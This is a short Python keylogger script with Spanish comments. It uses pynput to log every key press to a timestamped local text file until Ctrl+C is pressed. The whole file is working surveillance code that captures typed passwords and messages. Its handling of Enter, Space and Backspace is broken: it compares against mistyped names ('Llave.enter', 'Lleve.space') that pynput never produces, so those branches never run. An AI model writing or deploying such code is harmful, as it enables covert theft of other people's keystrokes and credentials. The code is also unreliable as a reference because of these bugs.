
import datetime
from pynput.keyboard import Listener

x = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")  # Registra fecha y hora
p = open(
    f"Keylogger-{x}.txt", "w"
)  # Guardar el archivo con la fecha y hora correspondiente


def registro(llave):
    llave = str(llave)

    if (
        llave == "'\\x03'"
    ):  # x03 representa Ctrl + C para parar la ejecucion del programa
        p.close()
        quit()

    elif llave == "Llave.enter":
        p.write("\n")

    elif llave == "Lleve.space":
        p.write(" ")

    elif llave == "Lleve.backspace":
        p.write("%BORRAR%")

    else:
        p.write(llave.replace("'", ""))


with Listener(on_press=registro) as u:
    u.join()
